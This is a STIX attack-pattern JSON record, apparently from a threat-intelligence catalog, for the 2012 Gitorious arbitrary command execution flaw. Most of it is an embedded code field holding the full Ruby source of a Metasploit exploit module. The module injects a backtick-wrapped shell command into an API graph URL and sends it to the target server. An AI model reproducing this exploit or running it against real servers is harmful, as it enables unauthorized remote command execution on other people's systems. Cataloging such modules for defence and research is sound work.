{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--628a7aad-aa4d-4530-a653-1dea5b228c99",
    "created": "2024-08-14T17:09:50.615762Z",
    "modified": "2024-08-14T17:09:50.615766Z",
    "name": "Gitorious Arbitrary Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in gitorious. Unvalidated input is passed to the shell allowing command execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/gitorious_graph.rb",
            "external_id": "gitorious_graph.rb"
        },
        {
            "source_name": "reference",
            "url": "http://gitorious.org/gitorious/mainline/commit/647aed91a4dc72e88a27476948dfbacd5d0bf7ce"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Gitorious Arbitrary Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution vulnerability\n        in gitorious. Unvalidated input is passed to the shell allowing\n        command execution.\n      },\n      'Author'         => [ 'joernchen <joernchen[at]phenoelit.de>' ], #Phenoelit\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '78480' ],\n          [ 'URL', 'http://gitorious.org/gitorious/mainline/commit/647aed91a4dc72e88a27476948dfbacd5d0bf7ce' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x60\",\n          'DisableNops' => true,\n          'Space'       => 31337,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n            }\n        },\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'DefaultTarget'  => 0,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2012-01-19'\n      ))\n\n      register_options(\n        [\n          OptString.new('URI', [true, \"Path to project and repository\", \"/project/repo\"]),\n        ])\n  end\n\n  def exploit\n    # Make sure the URI begins with a slash\n    uri = normalize_uri(datastore['URI'])\n\n    command = Rex::Text.uri_encode(payload.raw, 'hex-noslashes')\n    command.gsub!(\"%20\",\"%2520\")\n    res = send_request_cgi({\n      'uri'     => \"/api\"+ uri + \"/log/graph/%60#{command}%60\",\n      'method'  => 'GET',\n      'headers' =>\n      {\n        'Connection' => 'Close',\n      }\n    }) #default timeout, we don't care about the response\n\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-19",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}